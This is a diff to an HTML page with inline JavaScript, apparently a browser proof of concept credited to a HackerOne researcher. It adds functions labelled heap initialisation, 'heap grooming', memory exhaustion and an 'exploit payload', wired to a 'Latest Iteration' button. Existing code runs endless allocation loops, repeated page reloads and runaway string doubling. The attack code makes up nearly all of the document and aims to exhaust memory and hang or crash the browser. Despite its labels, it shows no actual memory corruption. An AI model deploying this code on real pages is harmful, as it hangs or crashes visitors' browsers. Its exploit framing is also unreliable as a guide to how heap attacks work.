@@ -39,6 +39,77 @@ let j4 = [];
 class k5 { constructor() {} }
 const l6 = () => { let m7 = 0; x1(); while (true) { let n8 = { a1: "data" }; let o9 = n8; console.log("Before:", o9.a1); n8 = null; try { console.log("After:", o9.a1); } catch (e) { console.log("Error:", e.message); } m7++; if (m7 >= 500) location.reload(); for (let p0 = 0; p0 < 1000; p0++) { j4.push(new k5()); } document.getElementById('msg').innerHTML = `Total ${j4.length} k5 objects created`; } }
 function q1() { let r2 = "A".repeat(1000000); while (true) { r2 += r2; if (r2.length > 1000000000) r2 = "A".repeat(1000000); } }
+// Step 1: Initialize Controlled Memory
+function initializeHeap() {
+    //alert("Int heap");
+    let buffers = [];
+    for (let i = 0; i < 2048; i++) { // Reduced allocations
+        buffers.push(new ArrayBuffer(500000)); // Smaller blocks of memory
+    }
+    return buffers;
+}
+
+// Step 2: Groom the Heap
+function groomHeap() {
+    //alert("groom heap");
+    let tempArray = [];
+
+    // Allocate and deallocate in patterns
+    for (let i = 0; i < 2048; i++) { // Reduced iterations
+        let buffer = new ArrayBuffer(1000); // Allocate smaller blocks
+        tempArray.push(buffer);
+    }
+
+    // Deallocate some of the buffers to create holes in the heap
+    for (let i = 0; i < 1512; i++) { // Fewer deallocations
+        tempArray[i] = null; // Free up space to create holes in the heap
+    }
+
+    return tempArray;
+}
+
+// Step 3: Memory Exhaustion Function
+function memExh() {
+    let bufferArray = [];
+    for (let i = 0; i < 2048; i++) { // Reduced iterations
+        bufferArray.push(new ArrayBuffer(900000)); // Allocate smaller buffers
+        if (bufferArray.length > 512) { // Less aggressive clearing
+            bufferArray = []; // Clear buffer array to exhaust memory
+        }
+    }
+}
+
+// Step 4: The Exploit Payload Function
+function payload() {
+    let largeString = "B".repeat(900000); // Smaller initial string
+    let obj = {};
+    let iterationCount = 0; // Counter to track number of iterations
+
+    while (true) {
+        // String concatenation
+        largeString += largeString;
+        if (largeString.length > 100000000) { // Lower threshold for reset
+            largeString = "B".repeat(900000); // Reset string to avoid overflow
+        }
+        memExh();
+        iterationCount++;
+        if (iterationCount > 64) break; // Control the number of iterations
+    }
+}
+
+// Step 5: Perform the Exploit
+function performExploit() {
+    let controlledBuffers = initializeHeap(); // Initialize the heap
+    let groomedHeap = groomHeap(); // Groom the heap
+    
+    // Start memory corruption
+    memExh();
+
+    // Run the payload
+    payload();
+}
+
+//performExploit();
 </script>
 </head>
 <body>
@@ -46,7 +117,7 @@ function q1() { let r2 = "A".repeat(1000000); while (true) { r2 += r2; if (r2.le
         Made By <a href="https://hackerone.com/debty" style="text-decoration: underline; color: darkblue;">DebTy</a> As Requested
     </div>
     <button onclick="l6()">Exploit Heap Memory Overflow</button>
-    <!--<button onclick="x1()">MACE</button>-->
+    <button onclick="performExploit()">Latest Iteration</button>
     <button onclick="y2()">String Overflow</button>
     <div id="msg"></div>
 </body>
